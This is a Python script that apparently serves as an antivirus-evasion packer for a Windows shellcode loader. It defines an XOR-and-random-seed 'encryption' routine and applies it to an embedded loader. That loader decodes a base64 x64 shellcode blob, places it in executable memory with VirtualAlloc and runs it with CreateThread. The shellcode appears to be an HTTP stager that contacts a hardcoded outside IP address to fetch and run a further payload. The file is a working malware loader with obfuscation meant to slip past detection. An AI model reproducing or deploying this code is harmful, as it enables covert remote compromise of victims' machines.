#coding:utf-8
import random
def my_decrypt(input_bytes, my_key):
    output = bytearray(len(input_bytes))
    random.seed(my_key)
    for i in range(len(input_bytes)):
        output[i] = input_bytes[i] ^ (random.randint(1, len(input_bytes)) & 0xff)
        output[i] = output[i] ^ my_key
    return output


def my_encrypt(input_bytes, my_key):
    output = bytearray(len(input_bytes))
    random.seed(my_key)
    for i in range(len(input_bytes)):
        output[i] = input_bytes[i] ^ my_key
        output[i] = output[i] ^ (random.randint(1, len(input_bytes)) & 0xff)
    return output

if __name__ == '__main__':
    input_content = r"""

import ctypes
import base64
import codecs
strs = "XHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDQ4XHgzMVx4YzlceDQ4XHgzMVx4ZDJceDRkXHgzMVx4YzBceDRkXHgzMVx4YzlceDQxXHg1MFx4NDFceDUwXHg0MVx4YmFceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGU5XHg5M1x4MDBceDAwXHgwMFx4NWFceDQ4XHg4OVx4YzFceDQxXHhiOFx4NzhceDAzXHgwMFx4MDBceDRkXHgzMVx4YzlceDQxXHg1MVx4NDFceDUxXHg2YVx4MDNceDQxXHg1MVx4NDFceGJhXHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NzlceDViXHg0OFx4ODlceGMxXHg0OFx4MzFceGQyXHg0OVx4ODlceGQ4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgzMlx4YzBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NDhceDgzXHhjM1x4NTBceDZhXHgwYVx4NWZceDQ4XHg4OVx4ZjFceGJhXHgxZlx4MDBceDAwXHgwMFx4NmFceDAwXHg2OFx4ODBceDMzXHgwMFx4MDBceDQ5XHg4OVx4ZTBceDQxXHhiOVx4MDRceDAwXHgwMFx4MDBceDQxXHhiYVx4NzVceDQ2XHg5ZVx4ODZceGZmXHhkNVx4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDlceGM3XHhjMFx4ZmZceGZmXHhmZlx4ZmZceDRkXHgzMVx4YzlceDUyXHg1Mlx4NDFceGJhXHgyZFx4MDZceDE4XHg3Ylx4ZmZceGQ1XHg4NVx4YzBceDBmXHg4NVx4OWRceDAxXHgwMFx4MDBceDQ4XHhmZlx4Y2ZceDBmXHg4NFx4OGNceDAxXHgwMFx4MDBceGViXHhiM1x4ZTlceGU0XHgwMVx4MDBceDAwXHhlOFx4ODJceGZmXHhmZlx4ZmZceDJmXHgzNFx4NTlceDU2XHg3YVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4NDBceDQxXHg1MFx4NWJceDM0XHg1Y1x4NTBceDVhXHg1OFx4MzVceDM0XHgyOFx4NTBceDVlXHgyOVx4MzdceDQzXHg0M1x4MjlceDM3XHg3ZFx4MjRceDQ1XHg0OVx4NDNceDQxXHg1Mlx4MmRceDUzXHg1NFx4NDFceDRlXHg0NFx4NDFceDUyXHg0NFx4MmRceDQxXHg0ZVx4NTRceDQ5XHg1Nlx4NDlceDUyXHg1NVx4NTNceDJkXHg1NFx4NDVceDUzXHg1NFx4MmRceDQ2XHg0OVx4NGNceDQ1XHgyMVx4MjRceDQ4XHgyYlx4NDhceDJhXHgwMFx4MzVceDRmXHgyMVx4NTBceDI1XHgwMFx4NTVceDczXHg2NVx4NzJceDJkXHg0MVx4NjdceDY1XHg2ZVx4NzRceDNhXHgyMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzFceDMwXHgyZVx4MzBceDNiXHgyMFx4NTdceDY5XHg2ZVx4NjRceDZmXHg3N1x4NzNceDIwXHg0ZVx4NTRceDIwXHgzNlx4MmVceDMxXHgzYlx4MjBceDU3XHg0Zlx4NTdceDM2XHgzNFx4M2JceDIwXHg1NFx4NzJceDY5XHg2NFx4NjVceDZlXHg3NFx4MmZceDM2XHgyZVx4MzBceDNiXHgyMFx4NGRceDQxXHg1M1x4NTBceDI5XHgwZFx4MGFceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4NDBceDQxXHg1MFx4NWJceDM0XHg1Y1x4NTBceDVhXHg1OFx4MzVceDM0XHgyOFx4NTBceDVlXHgyOVx4MzdceDQzXHg0M1x4MjlceDM3XHg3ZFx4MjRceDQ1XHg0OVx4NDNceDQxXHg1Mlx4MmRceDUzXHg1NFx4NDFceDRlXHg0NFx4NDFceDUyXHg0NFx4MmRceDQxXHg0ZVx4NTRceDQ5XHg1Nlx4NDlceDUyXHg1NVx4NTNceDJkXHg1NFx4NDVceDUzXHg1NFx4MmRceDQ2XHg0OVx4NGNceDQ1XHgyMVx4MjRceDQ4XHgyYlx4NDhceDJhXHgwMFx4MzVceDRmXHgyMVx4NTBceDI1XHg0MFx4NDFceDUwXHg1Ylx4MzRceDVjXHg1MFx4NWFceDU4XHgzNVx4MzRceDI4XHg1MFx4NWVceDI5XHgzN1x4NDNceDQzXHgyOVx4MzdceDdkXHgyNFx4NDVceDQ5XHg0M1x4NDFceDUyXHgyZFx4NTNceDU0XHg0MVx4NGVceDQ0XHg0MVx4NTJceDQ0XHgyZFx4NDFceDRlXHg1NFx4NDlceDU2XHg0OVx4NTJceDU1XHg1M1x4MmRceDU0XHg0NVx4NTNceDU0XHgyZFx4NDZceDQ5XHg0Y1x4NDVceDIxXHgyNFx4NDhceDJiXHg0OFx4MmFceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4MDBceDQxXHhiZVx4ZjBceGI1XHhhMlx4NTZceGZmXHhkNVx4NDhceDMxXHhjOVx4YmFceDAwXHgwMFx4NDBceDAwXHg0MVx4YjhceDAwXHgxMFx4MDBceDAwXHg0MVx4YjlceDQwXHgwMFx4MDBceDAwXHg0MVx4YmFceDU4XHhhNFx4NTNceGU1XHhmZlx4ZDVceDQ4XHg5M1x4NTNceDUzXHg0OFx4ODlceGU3XHg0OFx4ODlceGYxXHg0OFx4ODlceGRhXHg0MVx4YjhceDAwXHgyMFx4MDBceDAwXHg0OVx4ODlceGY5XHg0MVx4YmFceDEyXHg5Nlx4ODlceGUyXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDIwXHg4NVx4YzBceDc0XHhiNlx4NjZceDhiXHgwN1x4NDhceDAxXHhjM1x4ODVceGMwXHg3NVx4ZDdceDU4XHg1OFx4NThceDQ4XHgwNVx4MDBceDAwXHgwMFx4MDBceDUwXHhjM1x4ZThceDdmXHhmZFx4ZmZceGZmXHgzOFx4MzFceDJlXHgzN1x4MzBceDJlXHgzMlx4MzRceDM5XHgyZVx4MzFceDM2XHgzMlx4MDBceDAwXHgwMFx4MDBceDAw"
shellcode = bytearray(codecs.escape_decode(base64.b64decode(strs.strip()))[0])
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""

    key = 128
    encrypted = my_encrypt(input_content.encode('utf-8'), key)
    print("encrypted: ", end='')
    for i in encrypted:
        print("\\x%02x" % i, end='')

